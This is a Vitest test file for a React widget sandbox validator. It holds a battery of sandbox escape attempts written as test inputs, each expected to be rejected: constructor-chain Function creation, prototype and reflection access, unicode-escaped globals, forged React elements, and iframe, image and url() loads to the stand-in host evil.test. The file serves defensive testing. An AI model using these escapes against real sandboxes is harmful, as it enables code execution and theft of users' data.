// @vitest-environment node
import { readdirSync, readFileSync } from 'node:fs';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { MAX_WIDGET_SOURCE_LENGTH, validateWidget } from './validate-widget';

const fixtures = path.resolve(
    __dirname,
    '../../../../tests/Fixtures/widgets/valid',
);

const imports = `import { useState, useCallback } from 'react';
import { Bar, BarChart, Tooltip, XAxis } from 'recharts';
import { Wallet } from 'lucide-react';
import { get, cn } from '@whisper-money/widget-sdk';
`;

/** A widget whose body is `jsx`, after `setup` statements. */
function widget(jsx: string, setup = ''): string {
    return `${imports}
export default function Widget({ x, data }) {
    ${setup}
    return (${jsx});
}`;
}

/**
 * Known ways out of the sandbox, from the plan's phase 0 battery plus the ones
 * found while building the validator. Every one must be rejected, with the
 * error code that names why.
 */
const EVASIONS: [name: string, source: string, code: string][] = [
    // Computed brackets and atob
    [
        'computed brackets',
        widget('<div>{x[data.key]}</div>'),
        'computed-access',
    ],
    [
        'atob-built key',
        widget("<div>{x[atob('Y29uc3RydWN0b3I=')]}</div>"),
        'computed-access',
    ],
    ['atob as a global', widget("<div>{atob('eA==')}</div>"), 'global'],
    [
        'concatenated key',
        widget("<div>{x['const' + 'ructor']}</div>"),
        'computed-access',
    ],
    [
        'computed array index',
        widget('<div>{data[data.length - 1]}</div>'),
        'computed-access',
    ],
    // constructor chains
    [
        '[].constructor.constructor',
        widget("<div>{[].constructor.constructor('return fetch')()}</div>"),
        'forbidden-property',
    ],
    [
        'constructor by destructuring',
        widget('<div>{c}</div>', 'const { constructor: c } = [];'),
        'forbidden-property',
    ],
    [
        'constructor by nested destructuring',
        widget('<div>{f}</div>', 'const { a: { constructor: f } } = x;'),
        'forbidden-property',
    ],
    [
        'computed destructuring key',
        widget('<div>{v}</div>', 'const { [data.key]: v } = x;'),
        'computed-access',
    ],
    [
        'destructuring assignment with computed key',
        widget('<div>{v}</div>', 'let v; ({ [data.key]: v } = x);'),
        'destructuring-assignment',
    ],
    [
        'destructuring in for-of target',
        widget('<div>{v}</div>', 'let v; for ({ [data.key]: v } of data) {}'),
        'destructuring-assignment',
    ],
    [
        '__proto__ literal key',
        widget('<div>{o.a}</div>', 'const o = { __proto__: x };'),
        'forbidden-property',
    ],
    [
        'prototype access',
        widget('<div>{String.prototype.at}</div>'),
        'forbidden-property',
    ],
    [
        'optional chaining',
        widget("<div>{x?.['constructor']}</div>"),
        'forbidden-property',
    ],
    [
        'template literal key',
        widget('<div>{x[`constructor`]}</div>'),
        'forbidden-property',
    ],
    // Object reflection
    [
        'Object.getPrototypeOf',
        widget('<div>{Object.getPrototypeOf(x)}</div>'),
        'global',
    ],
    [
        'Object.getOwnPropertyDescriptor',
        widget("<div>{Object.getOwnPropertyDescriptor(x, 'a')}</div>"),
        'global',
    ],
    [
        'Object.defineProperty',
        widget("<div>{Object.defineProperty(x, 'a', {})}</div>"),
        'global',
    ],
    [
        'Object as a value',
        widget('<div>{o.keys(x)}</div>', 'const o = Object;'),
        'global',
    ],
    ['Reflect', widget('<div>{Reflect.ownKeys(x)}</div>'), 'global'],
    ['Proxy', widget('<div>{new Proxy(x, {})}</div>'), 'global'],
    ['Symbol', widget("<div>{Symbol.for('react.element')}</div>"), 'global'],
    // DOM from refs and events
    [
        'useRef',
        `import { useRef } from 'react';\nexport default function W() { const r = useRef(null); return <div />; }`,
        'import',
    ],
    [
        'ownerDocument from an event',
        widget('<div onClick={(e) => e.target.ownerDocument.defaultView} />'),
        'handler',
    ],
    [
        'ownerDocument property',
        widget('<div>{x.ownerDocument.defaultView.fetch}</div>'),
        'forbidden-property',
    ],
    [
        'handler declared as function with arguments',
        widget(
            '<div onClick={h} />',
            'function h() { return arguments[0].view; }',
        ),
        'global',
    ],
    // Recharts handlers and render props
    [
        'Recharts onClick reading the event',
        widget('<Bar onClick={(d, i, e) => e.view.fetch()} />'),
        'component-prop',
    ],
    [
        'Tooltip content render prop',
        widget('<Tooltip content={(props) => <div>{props.label}</div>} />'),
        'component-prop',
    ],
    [
        'Customized',
        `import { Customized } from 'recharts';\nexport default function W() { return <Customized component={() => null} />; }`,
        'import',
    ],
    [
        'Bar shape render prop',
        widget('<Bar shape={<div />} />'),
        'component-prop',
    ],
    [
        'Bar label element',
        widget('<Bar dataKey="v" label={<div />} />'),
        'component-prop',
    ],
    // Same handlers through a reference or a spread
    [
        'Recharts handler by reference',
        widget('<Bar onClick={h} />', 'const h = (d, i, e) => e.view;'),
        'component-prop',
    ],
    [
        'Recharts handler by spread',
        widget('<Bar {...{ onClick: h }} />', 'const h = (d, i, e) => e.view;'),
        'jsx-spread',
    ],
    [
        'native handler by reference with params',
        widget('<div onClick={h} />', 'const h = (e) => e.view;'),
        'handler',
    ],
    [
        'native handler from a let',
        widget('<div onClick={h} />', 'let h = () => 1;'),
        'handler',
    ],
    [
        'native handler from props',
        widget('<div onClick={x.onClick} />'),
        'handler',
    ],
    [
        'native handler swapped by reassignment',
        widget('<div onClick={h} />', 'function h() {}\nh = (e) => e.view;'),
        'reassign-function',
    ],
    ['spread on a native element', widget('<div {...x} />'), 'jsx-spread'],
    [
        'component called as a function',
        widget('<div>{Tooltip({ content: () => null })}</div>'),
        'component-value',
    ],
    [
        'component aliased to a variable',
        widget('<T onClick={h} />', 'const T = Bar; const h = (e) => e;'),
        'component-value',
    ],
    // Style props with url() and loose lucide props
    [
        'Tooltip wrapperStyle with url()',
        widget(
            "<Tooltip wrapperStyle={{ backgroundImage: 'url(https://evil.test/x)' }} />",
        ),
        'style',
    ],
    [
        'Tooltip contentStyle as a variable',
        widget(
            '<Tooltip contentStyle={s} />',
            "const s = { background: 'url(https://evil.test)' };",
        ),
        'style',
    ],
    [
        'lucide icon href',
        widget('<Wallet href="https://evil.test" />'),
        'component-prop',
    ],
    [
        'lucide icon onClick',
        widget('<Wallet onClick={() => 1} />'),
        'component-prop',
    ],
    [
        'lucide base Icon',
        `import { Icon } from 'lucide-react';\nexport default function W() { return <Icon iconNode={[]} />; }`,
        'import',
    ],
    [
        'fill with external url()',
        widget('<Bar fill="url(https://evil.test/p.svg#a)" />'),
        'url',
    ],
    [
        'fill with external url() in an expression',
        widget(
            "<svg><rect fill={x ? 'url(https://evil.test)' : 'red'} /></svg>",
        ),
        'url',
    ],
    // Unicode escapes
    [
        'escaped identifier property',
        widget('<div>{x.\\u0063onstructor}</div>'),
        'forbidden-property',
    ],
    [
        'escaped string key',
        widget('<div>{x["\\u0063onstructor"]}</div>'),
        'forbidden-property',
    ],
    ['escaped global', widget('<div>{\\u0077indow.fetch}</div>'), 'global'],
    // Tags from a variable
    [
        'tag from a string variable',
        widget('<Tag src="https://evil.test" />', "const Tag = 'iframe';"),
        'jsx-tag',
    ],
    ['tag from a prop', widget('<x.tag />'), 'jsx-tag'],
    ['iframe', widget('<iframe src="https://evil.test" />'), 'jsx-tag'],
    // svg image, formAction and other URL-taking attributes
    [
        'svg image href',
        widget('<svg><image href="https://evil.test/x.png" /></svg>'),
        'jsx-tag',
    ],
    ['svg use', widget('<svg><use href="#x" /></svg>'), 'jsx-tag'],
    ['foreignObject', widget('<svg><foreignObject /></svg>'), 'jsx-tag'],
    [
        'formAction',
        widget('<button formAction="https://evil.test">x</button>'),
        'jsx-attribute',
    ],
    [
        'submit button',
        widget('<button type="submit">x</button>'),
        'jsx-attribute',
    ],
    [
        'xlinkHref',
        widget('<svg><path xlinkHref="https://evil.test" /></svg>'),
        'jsx-attribute',
    ],
    [
        'namespaced xlink:href',
        widget('<svg><path xlink:href="https://evil.test" /></svg>'),
        'jsx-attribute',
    ],
    [
        'src on a div',
        widget('<div src="https://evil.test" />'),
        'jsx-attribute',
    ],
    [
        'dangerouslySetInnerHTML',
        widget("<div dangerouslySetInnerHTML={{ __html: '<img src=x>' }} />"),
        'jsx-attribute',
    ],
    ['ref callback', widget('<div ref={(node) => node} />'), 'jsx-attribute'],
    ['id outside linearGradient', widget('<div id="app" />'), 'jsx-attribute'],
    // style and classes
    [
        'style backgroundImage',
        widget("<div style={{ backgroundImage: 'url(https://evil.test)' }} />"),
        'style',
    ],
    ['style spread', widget('<div style={{ ...x }} />'), 'style'],
    ['style variable', widget('<div style={x.style} />'), 'style'],
    [
        'arbitrary url() class',
        widget('<div className="bg-[url(https://evil.test)]" />'),
        'class',
    ],
    ['arbitrary value class', widget('<div className="w-[37%]" />'), 'class'],
    ['dynamic className', widget('<div className={x.className} />'), 'class'],
    [
        'unknown class',
        widget('<div className="p-4 bg-fuchsia-500" />'),
        'class',
    ],
    // Globals and syntax widgets never need
    ['window', widget('<div>{window.location.href}</div>'), 'global'],
    ['document.cookie', widget('<div>{document.cookie}</div>'), 'global'],
    ['globalThis', widget('<div>{globalThis.fetch}</div>'), 'global'],
    ['fetch', widget("<div>{fetch('/api/v1/tokens')}</div>"), 'global'],
    ['eval', widget("<div>{eval('1')}</div>"), 'global'],
    ['Function', widget("<div>{Function('return 1')()}</div>"), 'global'],
    ['setTimeout', widget('<div />', 'setTimeout(() => {}, 1);'), 'global'],
    [
        'localStorage',
        widget("<div>{localStorage.getItem('a')}</div>"),
        'global',
    ],
    ['this', widget('<div>{this}</div>'), 'this'],
    [
        'class',
        `class A {}\nexport default function W() { return <div />; }`,
        'class',
    ],
    [
        'dynamic import()',
        widget("<div>{import('https://evil.test/x.js')}</div>"),
        'import',
    ],
    ['require', widget("<div>{require('fs')}</div>"), 'global'],
    ['import.meta', widget('<div>{import.meta.url}</div>'), 'meta-property'],
    [
        'declare const window',
        `declare const window: any;\nexport default function W() { return <div>{window.fetch}</div>; }`,
        'declare',
    ],
    [
        'bodiless overload of fetch',
        `function fetch(u: string): void;\nexport default function W() { fetch('x'); return <div />; }`,
        'declare',
    ],
    [
        'type-only import shadowing a global',
        `import type { fetch } from '@whisper-money/widget-sdk';\nexport default function W() { fetch('x'); return <div />; }`,
        'import',
    ],
    [
        '$$typeof to forge an element',
        widget(
            "<div>{{ ...x, $$typeof: e.$$typeof, type: 'iframe' }}</div>",
            'const e = <div />;',
        ),
        'forbidden-property',
    ],
    [
        'React element _owner',
        widget('<div>{e._owner}</div>', 'const e = <div />;'),
        'forbidden-property',
    ],
    // Imports
    [
        'default React import',
        `import React from 'react';\nexport default function W() { return <div />; }`,
        'import',
    ],
    [
        'namespace import',
        `import * as R from 'recharts';\nexport default function W() { return <div />; }`,
        'import',
    ],
    [
        'createElement',
        `import { createElement } from 'react';\nexport default function W() { return createElement('iframe'); }`,
        'import',
    ],
    [
        'jsx-runtime directly',
        `import { jsx } from 'react/jsx-runtime';\nexport default function W() { return jsx('iframe', {}); }`,
        'import',
    ],
    [
        'npm package',
        `import pad from 'left-pad';\nexport default function W() { return <div />; }`,
        'import',
    ],
    [
        'relative import',
        `import { a } from './a';\nexport default function W() { return <div />; }`,
        'import',
    ],
    [
        'side-effect import',
        `import 'recharts';\nexport default function W() { return <div />; }`,
        'import',
    ],
    [
        'Bun macro import attribute',
        `import { useMemo } from 'react' with { type: 'macro' };\nexport default function W() { return <div />; }`,
        'import',
    ],
    [
        're-export',
        `export * from 'react';\nexport default function W() { return <div />; }`,
        'export',
    ],
    [
        'jsxImportSource pragma',
        `/** @jsxImportSource evil */\nexport default function W() { return <div />; }`,
        'pragma',
    ],
    ['no default export', 'function W() { return <div />; }', 'default-export'],
    [
        'children as a function',
        widget('<Bar>{(props) => props}</Bar>'),
        'render-function',
    ],
    // TransactionList takes formatters that return text, never markup
    [
        'TransactionList render prop',
        `import { TransactionList } from '@whisper-money/widget-sdk';\nexport default function W() { return <TransactionList transactions={[]} renderRow={(row) => <div>{row.id}</div>} />; }`,
        'component-prop',
    ],
    [
        'TransactionList empty title as an element',
        `import { TransactionList } from '@whisper-money/widget-sdk';\nexport default function W() { return <TransactionList transactions={[]} emptyTitle={<b>x</b>} />; }`,
        'component-prop',
    ],
    [
        'TransactionList transactions as a function',
        `import { TransactionList } from '@whisper-money/widget-sdk';\nexport default function W() { return <TransactionList transactions={() => []} />; }`,
        'component-prop',
    ],
];

describe('validateWidget evasion battery', () => {
    it.each(EVASIONS)('rejects %s', (_name, source, code) => {
        const errors = validateWidget(source);

        expect(errors.map((error) => error.code)).toContain(code);
    });

    it('explains what to use instead', () => {
        const [error] = validateWidget(widget('<div>{x[data.key]}</div>'));

        expect(error).toMatchObject({ line: 8, code: 'computed-access' });
        expect(error.message).toContain('get(obj, key)');
        expect(
            validateWidget(widget('<div className="w-[37%]" />'))[0].message,
        ).toContain('w-1/3');
        expect(
            validateWidget(widget('<Bar onClick={() => 1} />'))[0].message,
        ).toContain('Allowed props: key, dataKey');
    });

    it('rejects sources over the size limit before parsing them', () => {
        const errors = validateWidget('x'.repeat(MAX_WIDGET_SOURCE_LENGTH + 1));

        expect(errors).toEqual([
            expect.objectContaining({ code: 'too-large' }),
        ]);
    });

    it.each([
        [
            'nested JSX',
            `export default function W() { return ${'<div>'.repeat(150)}${'</div>'.repeat(150)}; }`,
        ],
        [
            'nested parentheses',
            `export default function W() { return ${'('.repeat(9000)}1${')'.repeat(9000)}; }`,
        ],
    ])('rejects %s as too complex instead of overflowing', (_name, source) => {
        expect(validateWidget(source)).toEqual([
            expect.objectContaining({ code: 'too-complex' }),
        ]);
    });

    it('points viewport breakpoints at container breakpoints', () => {
        expect(
            validateWidget(widget('<div className="md:grid-cols-2" />'))[0]
                .message,
        ).toContain('@md:grid-cols-2');
    });

    it('lets get() read data fields called target, and nothing else on the list', () => {
        expect(
            validateWidget(
                widget(
                    "<div>{String(get(goal.progress, 'target'))}</div>",
                    'const goal = x;',
                ),
            ),
        ).toEqual([]);

        const dotted = validateWidget(
            widget(
                '<div>{String(goal.progress.target)}</div>',
                'const goal = x;',
            ),
        );

        expect(dotted).toEqual([
            expect.objectContaining({ code: 'forbidden-property' }),
        ]);
        expect(dotted[0].message).toContain("use get(obj, 'target')");
        expect(
            validateWidget(widget("<div>{String(get(x, 'view'))}</div>")),
        ).toEqual([expect.objectContaining({ code: 'forbidden-property' })]);
        expect(
            validateWidget(
                widget("<div>{String(get(x, 'constructor'))}</div>"),
            )[0].code,
        ).toBe('forbidden-property');
    });

    it('reports syntax errors', () => {
        expect(
            validateWidget('export default function W( { return <div> }')[0]
                .code,
        ).toBe('syntax');
    });
});

describe('validateWidget valid widgets', () => {
    const files = readdirSync(fixtures).filter((file) => file.endsWith('.tsx'));

    it.each(files)('accepts %s', (file) => {
        expect(
            validateWidget(readFileSync(path.join(fixtures, file), 'utf8')),
        ).toEqual([]);
    });

    it.each([
        [
            'handler declared as a function',
            widget(
                '<button type="button" onClick={open}>Abrir</button>',
                'function open() {}',
            ),
        ],
        [
            'handler from useCallback',
            widget(
                '<div onClick={open} />',
                'const [, set] = useState(false); const open = useCallback(() => set(true), []);',
            ),
        ],
        [
            'computed key through get()',
            widget('<div>{String(get(x, data.key))}</div>'),
        ],
        [
            'literal keys and indexes',
            widget("<div>{x['name']}{x[0]}{x.at(-1)}</div>"),
        ],
        [
            'cn with conditions',
            widget(
                "<div className={cn('p-2', data.big ? 'text-lg' : 'text-sm', data.muted && 'text-muted-foreground')} />",
            ),
        ],
        [
            'container and dark variants',
            widget(
                '<div className="grid grid-cols-1 @sm:grid-cols-2 dark:bg-zinc-900" />',
            ),
        ],
        [
            'local component with callbacks',
            widget(
                '<Row onPick={(id) => id} />',
                'function Row({ onPick }) { return <div onClick={() => onPick(1)} />; }',
            ),
        ],
        [
            'gradient fill by literal url(#id)',
            widget(
                '<svg><defs><linearGradient id="g"><stop offset="0" stopColor="red" /></linearGradient></defs><rect fill="url(#g)" /></svg>',
            ),
        ],
        [
            'data-driven style values',
            widget(
                '<div style={{ width: `${x.pct}%`, backgroundColor: x.color }} />',
            ),
        ],
        [
            'types and generics',
            `import { useState } from 'react';\ntype Row = { a: number };\nexport default function W() { const [rows] = useState<Row[]>([]); return <div>{(rows as Row[]).length}</div>; }`,
        ],
        [
            'safe globals and statics',
            widget(
                '<div>{Math.max(...Object.values(x).map(Number))}{JSON.stringify(Array.from(new Set([1])))}{new Intl.NumberFormat().format(1)}</div>',
            ),
        ],
        [
            'rotated axis ticks',
            widget(
                '<BarChart data={x}><XAxis dataKey="m" tick={{ angle: -45, dx: -4, textAnchor: \'end\', fontSize: 11 }} /></BarChart>',
            ),
        ],
        [
            'TransactionList with formatters, hide and limit',
            `import { Button, TransactionList, useWidgetData, useWidgetEnv, wm } from '@whisper-money/widget-sdk';
export default function W() {
    const { tx } = useWidgetData();
    const { isCompact } = useWidgetEnv();
    return (
        <div className="flex h-full flex-col">
            <Button size="sm" onClick={() => wm.download('moto', tx.data)}>CSV</Button>
            <TransactionList
                transactions={tx}
                description={(row) => row.description.replace('Pago en ', '')}
                badge={(row) => (row.amount < -10000 ? 'Compra' : null)}
                hide={isCompact ? ['notes'] : []}
                hiddenLabelId="label-1"
                limit={20}
                showDayTotals={!isCompact}
                emptyTitle="Sin movimientos"
                emptyDescription={\`Nada desde \${tx.from}\`}
            />
        </div>
    );
}`,
        ],
        [
            'Recharts formatters with parameters',
            widget(
                '<BarChart data={x}><Tooltip formatter={(value, name, item) => `${name}: ${value}`} /><Bar dataKey="v" /></BarChart>',
            ),
        ],
    ])('accepts %s', (_name, source) => {
        expect(validateWidget(source)).toEqual([]);
    });
});
